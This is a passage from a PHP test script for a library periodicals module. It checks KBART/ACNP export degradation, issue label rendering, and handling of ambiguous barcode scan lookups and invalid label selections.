    // degraded SQL branch is the one that really runs.
    $forceProbe = static function (string $class, mysqli $handle, array $tables): void {
        $prop = new \ReflectionProperty($class, 'tableCache');
        $prop->setAccessible(true);
        $cache = $prop->getValue();
        foreach ($tables as $table => $exists) {
            $key = spl_object_id($handle) . '|' . $table;
            if ($exists === null) {
                unset($cache[$key]);
            } else {
                $cache[$key] = $exists;
            }
        }
        $prop->setValue(null, $cache);
    };

    $forceProbe(KbartExporter::class, $db, ['editori' => false]);
    $tsvDegraded = KbartExporter::kbart($db, $testataId);
    $degradedLines = explode("\n", rtrim($tsvDegraded, "\n"));
    check(
        count($degradedLines) === 2,
        'without `editori` the KBART export still emits the holdings row, not a header-only file'
    );
    $degradedRow = array_combine($expectedColumns, explode("\t", $degradedLines[1]));
    check(
        $degradedRow['publication_title'] === $TITLE_MAIN
        && $degradedRow['print_identifier'] === $ISSN
        && $degradedRow['notes'] !== '',
        'the degraded row keeps title, ISSN and holdings — only the publisher column degrades'
    );
    check($degradedRow['publisher_name'] === '', 'the publisher column degrades to empty');
    $csvDegraded = KbartExporter::acnp($db, $testataId);
    check(
        count(explode("\n", rtrim($csvDegraded, "\n"))) === 2,
        'the ACNP export degrades the same way instead of emptying itself'
    );
    $forceProbe(KbartExporter::class, $db, ['editori' => null]);
    check(
        str_contains(KbartExporter::kbart($db, $testataId), $PUBLISHER),
        'with `editori` present the publisher is joined again (the probe, not a hardcoded degradation)'
    );

    $forceProbe(IssueLabelRenderer::class, $db, ['mensole' => false, 'scaffali' => false]);
    $htmlDegraded = IssueLabelRenderer::labelsHtml($db, [$ownBarcodeIssue]);
    check(
        substr_count($htmlDegraded, 'class="emeroteca-label"') === 1,
        'without `mensole`/`scaffali` the label is still produced (the shelfmark is what degrades)'
    );
    check(
        str_contains($htmlDegraded, 'INV-1999-1'),
        'the degraded label still carries the inventory number'
    );
    $forceProbe(IssueLabelRenderer::class, $db, ['mensole' => null, 'scaffali' => null]);

    // ── 14. Scan lookup: ambiguity is never resolved by guessing ──────
    $reqFactory = new \Slim\Psr7\Factory\ServerRequestFactory();
    $resFactory = new \Slim\Psr7\Factory\ResponseFactory();
    $getReq = static function (string $path, array $query) use ($reqFactory): \Psr\Http\Message\ServerRequestInterface {
        return $reqFactory->createServerRequest('GET', $path)->withQueryParams($query);
    };
    $decode = static function (\Psr\Http\Message\ResponseInterface $response): array {
        $decoded = json_decode((string) $response->getBody(), true);
        return is_array($decoded) ? $decoded : [];
    };
    $exports = new ExportAdminController($db, $hookManager);

    // Two issues of the SAME title share one barcode (a real-world duplicate
    // data-entry): the Kardex must not pick one of them and offer "receive".
    $AMB_SAME = '9771111111117';
    $ambAnnata = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 2001, '3')",
        'i',
        [$testataId]
    );
    $ambIssueA = $insertFascicolo($ambAnnata, '20', 'atteso', $AMB_SAME);
    $ambIssueB = $insertFascicolo($ambAnnata, '21', 'atteso', $AMB_SAME);
    check($ambIssueA > 0 && $ambIssueB > 0, 'ambiguity fixture: two issues share one barcode');

    $payload = $decode($exports->scanLookup(
        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_SAME]),
        $resFactory->createResponse()
    ));
    check(
        ($payload['match'] ?? '') === 'ambiguous',
        "a barcode matching two issues answers 'ambiguous' (got '" . ($payload['match'] ?? '') . "')"
    );
    check((int) ($payload['matches'] ?? 0) === 2, 'the payload reports how many issues matched');
    check(!isset($payload['issue']), 'no issue is proposed when the code is ambiguous');
    // NB: `?? 'x'` would swallow a legitimate null — test the key itself.
    check(
        array_key_exists('action', $payload) && $payload['action'] === null,
        'no "receive" action is suggested for an ambiguous code'
    );
    check(
        (int) ($payload['title']['id'] ?? 0) === $testataId,
        'the ambiguous answer resolves to the testata the matches share'
    );
    check(
        is_string($payload['message'] ?? null) && $payload['message'] !== '',
        'the ambiguous answer explains itself to the operator'
    );

    // Scoping to the very title that holds both matches stays ambiguous:
    // ?testata= narrows the search, it never picks a winner.
    $payload = $decode($exports->scanLookup(
        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_SAME, 'testata' => (string) $testataId]),
        $resFactory->createResponse()
    ));
    check(
        ($payload['match'] ?? '') === 'ambiguous',
        'scoping to the title that owns both matches is still ambiguous'
    );

    // Same code on two DIFFERENT titles, and no testata owns it as its EAN
    // base: there is nothing honest to link to.
    $AMB_CROSS = '9772222222226';
    $crossAnnata = $exec(
        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 2002, '5')",
        'i',
        [$xssId]
    );
    $insertFascicolo($ambAnnata, '30', 'atteso', $AMB_CROSS);
    $crossIssue = $insertFascicolo($crossAnnata, '30', 'atteso', $AMB_CROSS);
    check($crossIssue > 0, 'ambiguity fixture: the same barcode also exists under another title');

    $payload = $decode($exports->scanLookup(
        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_CROSS]),
        $resFactory->createResponse()
    ));
    check(
        ($payload['match'] ?? '') === 'ambiguous'
        && array_key_exists('title', $payload) && $payload['title'] === null,
        'matches spread over several titles are ambiguous with no link to guess at'
    );

    // …but scoping to a title that holds exactly ONE of them is a legitimate
    // narrowing and resolves uniquely.
    $payload = $decode($exports->scanLookup(
        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_CROSS, 'testata' => (string) $xssId]),
        $resFactory->createResponse()
    ));
    check(
        ($payload['match'] ?? '') === 'issue' && (int) ($payload['issue']['id'] ?? 0) === $crossIssue,
        'scoping to a title holding a single match resolves to that issue'
    );

    // A unique barcode still resolves to its issue, add-on and all.
    $payload = $decode($exports->scanLookup(
        $getReq('/admin/periodicals/scan-lookup', ['code' => $ownBarcode]),
        $resFactory->createResponse()
    ));
    check(
        ($payload['match'] ?? '') === 'issue' && (int) ($payload['issue']['id'] ?? 0) === $ownBarcodeIssue,
        'a barcode matching exactly one issue still resolves to it'
    );

    // `?code[]=x` must not raise "Array to string conversion": the warning is
    // printed BEFORE the body and breaks the caller's response.json().
    ob_start();
    $arrayRes = $exports->scanLookup(
        $getReq('/admin/periodicals/scan-lookup', ['code' => ['9771111111117']]),
        $resFactory->createResponse()
    );
    $stray = (string) ob_get_clean();
    check($stray === '', 'an array `code` parameter emits no stray output before the JSON (got: ' . $stray . ')');
    check(
        json_decode((string) $arrayRes->getBody(), true) !== null,
        'the response to an array `code` parameter is still parseable JSON'
    );

    // ── 15. Labels: an invalid selection is not "nothing selected" ─────
    $postReq = $reqFactory->createServerRequest('POST', '/admin/periodicals/' . $xssId . '/issues/labels')
        ->withParsedBody(['ids' => [(string) $ownBarcodeIssue]]);
    unset($_SESSION['error_message'], $_SESSION['success_message']);
    $exports->labels($postReq, $resFactory->createResponse(), ['id' => (string) $xssId]);
    check(
        ($_SESSION['error_message'] ?? '') !== ''
        && ($_SESSION['error_message'] ?? '') !== 'Nessun fascicolo selezionato.',
        'issues belonging to another testata are refused as an INVALID selection, not as an empty one (got: "'
            . ($_SESSION['error_message'] ?? '') . '")'
    );
    unset($_SESSION['error_message'], $_SESSION['success_message']);
} catch (\Throwable $e) {
    $cleanup();
    $db->close();
    fwrite(STDERR, "\nFAIL: " . $e->getMessage() . "\n");
    exit(1);
}

$cleanup();
$db->close();

printf("\nALL %d PASS\n", $TESTNO);
